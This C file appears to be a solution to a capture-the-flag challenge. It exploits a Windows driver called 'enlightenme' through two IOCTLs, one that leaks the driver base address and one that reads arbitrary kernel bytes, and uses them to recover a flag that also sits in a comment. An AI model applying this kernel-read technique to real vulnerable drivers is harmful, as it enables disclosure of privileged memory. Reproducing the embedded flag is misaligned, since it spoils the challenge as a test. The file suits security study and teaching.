#include <stdio.h>
#include <windows.h>
#include <winternl.h>

static void __assert(const char *Cond, const char *File, int Line) {
  DWORD LastError = GetLastError();
  printf("Assertion failed: %s, file %s, line %d, last error %lu\n", Cond, File,
         Line, LastError);
  exit(1);
}

#define assert(Cond)                                                           \
  do {                                                                         \
    if (!(Cond))                                                               \
      __assert(#Cond, __FILE__, __LINE__);                                     \
  } while (0)

static void *GetDriverAddress(HANDLE Device, const char *Name) {
  char Request[0x10];
  strcpy(Request, Name);
  DWORD BytesReturned;
  BOOL Ok = DeviceIoControl(
      /* hDevice */ Device,
      /* dwIoControlCode */ 0x222004,
      /* lpInBuffer */ Request,
      /* nInBufferSize */ strlen(Request) + 1,
      /* lpOutBuffer */ Request,
      /* nOutBufferSize */ sizeof(Request),
      /* lpBytesReturned */ &BytesReturned,
      /* lpOverlapped */ NULL);
  assert(Ok);
  assert(BytesReturned == 8);
  return *(void **)Request;
}

static BYTE ReadByte(HANDLE Device, void *Addr) {
  BYTE Request[8];
  *(void **)Request = Addr;
  DWORD BytesReturned;
  BOOL Ok = DeviceIoControl(
      /* hDevice */ Device,
      /* dwIoControlCode */ 0x22200C,
      /* lpInBuffer */ Request,
      /* nInBufferSize */ sizeof(Request),
      /* lpOutBuffer */ Request,
      /* nOutBufferSize */ sizeof(Request),
      /* lpBytesReturned */ &BytesReturned,
      /* lpOverlapped */ NULL);
  assert(Ok);
  assert(BytesReturned == 1);
  return Request[0];
}

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  printf("\n");

  HANDLE Device = CreateFile(
      /* lpFileName */ "\\\\.\\enlightenme",
      /* dwDesiredAccess */ GENERIC_READ | GENERIC_WRITE,
      /* dwShareMode */ 0,
      /* lpSecurityAttributes */ NULL,
      /* dwCreationDisposition */ OPEN_EXISTING,
      /* dwFlagsAndAttributes */ FILE_ATTRIBUTE_NORMAL,
      /* hTemplateFile */ NULL);
  assert(Device != INVALID_HANDLE_VALUE);

  void *DriverAddress = GetDriverAddress(Device, "enlightenme");
  printf("DriverAddress = %p\n", DriverAddress);

  char Flag[64];
  memset(Flag, 0, sizeof(Flag));
  for (size_t i = 0, j = 0; i < sizeof(Flag) - 1; j++) {
    Flag[i] = ReadByte(Device, DriverAddress + 0x118f8 + j);
    if (Flag[i]) i++;
  }
  // CTF-BR{!!Gu3Ss_7he_4nswer_Was_Never_Me4nt_70_be_F0und!!!!!!}
  printf("%s\n", Flag);
}
